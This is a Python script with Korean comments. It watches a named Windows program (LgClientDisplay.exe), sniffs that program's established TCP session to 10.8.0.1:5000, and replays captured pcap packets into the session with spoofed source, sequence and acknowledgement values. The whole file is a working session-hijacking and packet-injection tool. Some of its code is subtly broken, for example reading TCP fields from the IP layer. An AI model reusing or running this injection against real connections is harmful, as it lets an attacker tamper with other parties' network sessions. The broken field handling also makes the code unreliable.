import psutil
import time
from scapy.all import *

# 타겟 IP와 포트
target_ip = "10.8.0.1"
target_port = 5000

# A 프로그램의 이름
a_program_name = "LgClientDisplay.exe"

# PCAP 파일 경로
pcap_file = "fire.pcap"

# 네트워크 인터페이스 이름
interface = "OpenVPN Connect DCO Adapter"

# Scapy 로깅 비활성화
conf.verb = 0

# RSL 프로토콜 정의
class IPA(Packet):
    name = "IPA"
    fields_desc = [
        ByteField("proto", 0x00),
        ByteField("len", None),
    ]

    def post_build(self, p, pay):
        if self.len is None:
            l = len(pay)
            p = p[:1] + struct.pack("!B", l) + p[2:]
        return p + pay

class RSL(Packet):
    name = "RSL"
    fields_desc = [
        ByteEnumField("proto", 0x00, {0x00: "RSL"})
    ]

bind_layers(IPA, RSL, proto=0x00)

# PCAP 파일을 읽어옴
packets = rdpcap(pcap_file)

def get_pid_by_name(name):
    """ 주어진 프로그램 이름으로 PID를 찾습니다. """
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'] == name:
            return proc.info['pid']
    return None

def get_tcp_connection_info(pid):
    """ 주어진 PID로 TCP 연결 정보를 가져옵니다. """
    for conn in psutil.net_connections(kind='tcp'):
        if conn.pid == pid and conn.raddr.ip == target_ip and conn.raddr.port == target_port:
            return conn.laddr.port, conn.status, conn.raddr.ip, conn.raddr.port, conn.raddr
    return None

# 주기적으로 A 프로그램의 TCP 연결 상태 확인
while True:
    a_program_pid = get_pid_by_name(a_program_name)
    if a_program_pid:
        connection_info = get_tcp_connection_info(a_program_pid)
        if connection_info:
            local_port, status, remote_ip, remote_port, raddr = connection_info
            if status == 'ESTABLISHED':
                # 현재 세션의 시퀀스 번호와 응답 번호를 동적으로 가져오기
                # 네트워크 인터페이스를 지정하여 패킷 캡처
                captured_packets = sniff(filter=f"ip and src port {local_port}", count=1, timeout=10, iface=interface)
                if captured_packets:
                    last_seq = captured_packets[0][IP].seq
                    last_ack = captured_packets[0][IP].ack
                    print(last_seq, last_ack)
                    # 각 패킷을 타겟 IP와 포트로 재전송
                    for packet in packets:
                        if IP in packet:
                            packet[IP].dst = target_ip
                            packet[IP].src = captured_packets[0][IP].src
                            packet[IP].sport = captured_packets[0][IP].sport
                            packet[IP].seq = last_seq
                            packet[IP].ack = last_ack + 1
                            packet[IP].id = captured_packets[0][IP].id + 1
                            packet[IP].ttl = captured_packets[0][IP].ttl
                            # 패킷 재계산
                            packet[IP].chksum = None
                            packet[TCP].chksum = None
                            last_seq += len(packet[TCP].payload)
                            last_ack += 1

                            packet = bytes(packet)
                            
                            # 패킷 전송 (sendp 사용)
                            sendp(packet, iface=interface)
                            
                    print("Packets sent successfully!")
                    break

    time.sleep(0.5)
